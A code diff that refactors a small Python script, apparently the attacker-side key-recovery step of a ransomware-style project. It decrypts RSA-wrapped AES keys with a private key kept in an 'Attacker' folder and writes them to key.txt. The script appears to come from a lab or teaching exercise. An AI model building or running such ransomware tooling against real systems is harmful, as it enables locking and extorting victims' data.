@@ -10,21 +10,21 @@ def get_encrypted_keys(path):
     return encrypted_keys[:-1]
 
 
-def generate_aes_key_file(aes_keys, path):
-    with open(os.path.join(path, "key.txt"), "wb") as f:
+def generate_aes_key_file(aes_keys):
+    with open("key.txt", "wb") as f:
         for aes_key in aes_keys:
             f.write(aes_key)
             f.write(str.encode('~@*@~'*30))
 
 
-keys = get_encrypted_keys("/Users/Shekar/Desktop/attachment.txt")
+def create_attachment(file_path):
+    keys = get_encrypted_keys(file_path)
 
-decrypted_keys = []
-for key in keys:
-    priv_key = open('../Attacker/irritating-doggo_private.pem', "r").read()
-    rsakey = PKCS1_OAEP.new(RSA.importKey(priv_key))
-    decrypted_keys.append(rsakey.decrypt(key))
+    decrypted_keys = []
+    for key in keys:
+        priv_key = open('../Attacker/irritating-doggo_private.pem', "r").read()
+        rsakey = PKCS1_OAEP.new(RSA.importKey(priv_key))
+        decrypted_keys.append(rsakey.decrypt(key))
 
-generate_aes_key_file(decrypted_keys, "/Users/Shekar/Desktop/")
-
+    generate_aes_key_file(decrypted_keys)
 
